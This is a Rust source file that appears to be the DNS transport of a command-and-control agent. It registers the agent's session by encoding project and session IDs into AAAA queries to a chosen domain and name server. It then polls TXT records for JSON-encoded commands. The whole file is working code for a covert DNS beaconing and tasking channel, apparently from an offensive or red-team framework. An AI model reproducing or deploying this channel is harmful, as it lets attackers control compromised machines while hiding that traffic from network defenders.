use core::net::{SocketAddr};

use hickory_resolver::{Resolver};
use hickory_resolver::config::{NameServerConfig, ResolverConfig, ResolverOpts, Protocol};
use rand::Rng;

use crate::transport::Transport;
use crate::session::Session;
use crate::command::CommandInfo;

pub struct DNS {
    pub server: String,
    pub domain: String,

    session: Session,

    resolver: Resolver,
}

fn generate_blob(length: usize) -> String {
    rand::thread_rng()
        .sample_iter(&rand::distributions::Alphanumeric)
        .take(length)
        .map(char::from)
        .collect()
}

impl Transport for DNS {
    fn register_session(&self) -> Result<(), String> {
        let query = format!(
            "{}.{}.{}.{}",
            self.session.project_id,
            self.session.id,
            generate_blob(4),
            self.domain
        );

        return match self.resolver.ipv6_lookup(query) {
            Ok(_) => {
                Ok(())
            }
            Err(e) => {
                Err(format!("Failed to register session: {}", e))
            }
        }
    }

    fn command_info(&self) -> Result<Option<CommandInfo>, String> {
        let query = format!(
            "{}.{}.{}",
            self.session.id,
            generate_blob(4),
            self.domain,
        );

        match self.resolver.txt_lookup(query) {
            Ok(resp) => {
                let response = resp.as_lookup().record_iter()
                    .filter_map(|record| record.data()?.as_txt().map(|txt| txt.to_string()))
                    .collect::<Vec<_>>()
                    .join(""); // Use join to convert Vec<String> to a single String

                if response == "null" {
                    return Ok(None)
                }

                match serde_json::from_str(response.as_str()) {
                    Ok(cmd_info) => return Ok(Some(cmd_info)),
                    Err(e) => println!("Error deserializing the data: {}", e)
                }
            },
            Err(_) => {}
        }
        return Ok(None)
    }
}

impl DNS {
    pub fn new(server: String, domain: String, session: Session) -> DNS {
        let resolver;
        if server == "" {
            resolver = Resolver::from_system_conf().unwrap()
        } else {
            match server.parse::<SocketAddr>() {
                Ok(socket) => {
                    let mut resolver_config = ResolverConfig::new();
                    resolver_config.add_name_server(NameServerConfig::new(socket, Protocol::Udp));
                    resolver_config.add_name_server(NameServerConfig::new(socket, Protocol::Tcp));

                    resolver = Resolver::new(resolver_config, ResolverOpts::default()).unwrap();
                }
                Err(_) => resolver = Resolver::from_system_conf().unwrap()
            }
        }

        DNS {
            server,
            domain,
            session,
            resolver,
        }
    }
}